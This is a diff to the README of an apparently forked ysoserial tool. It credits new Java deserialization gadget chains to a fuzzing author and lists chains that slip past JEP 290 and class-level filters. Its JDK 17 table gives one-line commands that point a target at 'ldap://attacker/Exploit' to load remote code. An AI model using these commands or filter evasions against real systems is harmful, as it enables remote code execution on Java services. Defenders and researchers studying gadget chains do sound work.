@@ -17,7 +17,7 @@ Standard deserialization filters (JEP 290, custom `ObjectInputFilter`) typically
 |-------------|--------|-----------------|
 | `ConcurrentHashMap` | CC10, CC11, ROME4, Hibernate3, ROMEJndi | Rarely blocked — used extensively in JDK internals |
 | `TreeBag` | CB3 | CC4-specific class, not in standard filter lists |
-| `LinkedHashSet` | CC12, CC13, CC15 | Extends HashSet but class-level filters often miss it |
+| `LinkedHashSet` | CC12, CC13 †, CC15 | Extends HashSet but class-level filters often miss it |
 | `TreeSet` | Click2, BeanShell2 | Standard JDK class, never blocked in known filters |
 | `BadAttributeValueExpException` | ROME2, Jackson1, Jackson2 | JMX class, not commonly filtered |
 | `Hashtable` | ROME3 | Some filters miss this older Map implementation |
@@ -30,7 +30,7 @@ Standard deserialization filters (JEP 290, custom `ObjectInputFilter`) typically
 |-------|------|----------------------------------|
 | `CC14` | `InstantiateTransformer` → `TrAXFilter` → `TemplatesImpl` | Same package as InvokerTransformer, but rarely filtered |
 | `CC15` | Same as CC14 + LinkedHashSet root | Double evasion: root + sink bypass |
-| `CC13` | Cross-library CC4→CC3 + InvokerTransformer | Version-specific filters miss cross-library |
+| `CC13` † | Cross-library CC4→CC3 + InvokerTransformer | Version-specific filters miss cross-library |
 
 ### JDK 17+ Compatible (No TemplatesImpl)
 
@@ -39,7 +39,7 @@ These chains work without `--add-opens java.xml` by using JNDI sinks instead of 
 | Chain | Sink | Usage |
 |-------|------|-------|
 | `CommonsCollectionsJndi` | `InitialContext.doLookup()` | `java -jar ysoserial.jar CommonsCollectionsJndi 'ldap://attacker/Exploit'` |
-| `CommonsCollectionsJndi2` | CC4+CC3 cross-lib → `doLookup()` | `java -jar ysoserial.jar CommonsCollectionsJndi2 'ldap://attacker/Exploit'` |
+| `CommonsCollectionsJndi2` † | CC4+CC3 cross-lib → `doLookup()` | `java -jar ysoserial.jar CommonsCollectionsJndi2 'ldap://attacker/Exploit'` |
 | `Jackson2` | `POJONode` → `JdbcRowSetImpl` → JNDI | `java -jar ysoserial.jar Jackson2 'ldap://attacker/Exploit'` |
 | `ROMEJndi` | `JdbcRowSetImpl` → JNDI | `java -jar ysoserial.jar ROMEJndi 'ldap://attacker/Exploit'` |
 | `CommonsBeanutilsJndi` | `JdbcRowSetImpl` → JNDI | `java -jar ysoserial.jar CommonsBeanutilsJndi 'ldap://attacker/Exploit'` |
@@ -87,9 +87,11 @@ These bypass first-layer type filters by wrapping an inner payload:
 | `CommonsBeanutils3` | @BofeiC | CB + TreeBag entry — bypasses PriorityQueue AND InvokerTransformer filters |
 | `Click2` | @BofeiC | Apache Click via TreeSet entry — bypasses PriorityQueue filters |
 | `BeanShell2` | @BofeiC | BeanShell interpreter via TreeSet entry — bypasses PriorityQueue filters |
-| `CommonsCollections13` | @BofeiC | CC4 TiedMapEntry + CC3 LazyMap + LinkedHashSet — cross-library + root bypass |
+| `CommonsCollections13` | @dmbs335 † | CC4 TiedMapEntry + CC3 LazyMap + LinkedHashSet — cross-library + root bypass |
 | `CommonsCollections14` | @zema1 | CC6 trigger + InstantiateTransformer sink — InvokerTransformer filter bypass |
 | `CommonsCollections15` | @zema1, @BofeiC | LinkedHashSet + InstantiateTransformer — double evasion (root + sink) |
+
+> **†** Discovered by @dmbs335 via automated differential fuzzing ([web-fuzzer](https://github.com/dmbs335/web-fuzzer), 2026-03-14). The fuzzer's deserialization domain identified novel cross-library CC3+CC4 chain combinations that bypass version-specific filters.
 
 ### Exploit Tools
 
@@ -133,11 +135,11 @@ CommonsCollections9    @meizjm3i                              commons-collection
 CommonsCollections10   @BofeiC                                commons-collections:3.1
 CommonsCollections11   @BofeiC                                commons-collections4:4.0
 CommonsCollections12   @BofeiC                                commons-collections:3.1
-CommonsCollections13   @BofeiC                                commons-collections:3.1, commons-collections4:4.0
+CommonsCollections13   @dmbs335 †                             commons-collections:3.1, commons-collections4:4.0
 CommonsCollections14   @zema1                                 commons-collections:3.1
 CommonsCollections15   @zema1, @BofeiC                        commons-collections:3.1
 CommonsCollectionsJndi @BofeiC                                commons-collections:3.1
-CommonsCollectionsJndi2 @BofeiC                               commons-collections:3.1, commons-collections4:4.0
+CommonsCollectionsJndi2 @dmbs335 †                            commons-collections:3.1, commons-collections4:4.0
 FileUpload1            @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
 Groovy1                @frohoff                               groovy:2.3.9
 GroovyGStr             @BofeiC                                groovy:2.4.3
